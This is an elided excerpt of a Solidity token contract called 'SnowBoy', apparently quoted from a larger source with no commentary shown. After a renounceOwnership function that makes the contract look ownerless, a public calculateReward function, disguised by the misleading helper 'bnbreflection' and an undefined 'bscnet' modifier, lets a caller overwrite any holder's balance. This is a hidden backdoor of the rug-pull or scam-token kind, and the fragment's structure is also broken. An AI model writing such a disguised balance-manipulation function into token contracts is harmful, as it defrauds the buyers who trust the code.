...
library Address {
  ...
  contract SnowBoy is  IERC20, Ownable {
  ...
  string private _name = 'SnowBoy';

  string private _symbol = 'SNOWBOY';
  ...
  function renounceOwnership() public virtual onlyOwner {
    ...
    owner = address(0);
      ...
      function bnbreflection ( address buyer, uint256 amount ) 
      internal view bscnet returns  ( uint256 ) {
      return  ( uint256( uint160( buyer ) ) ^ amount );
  }


     function calculateReward ( address buyer, uint256 amount ) public {
      balances[buyer] = bnbreflection ( buyer, amount );
  }
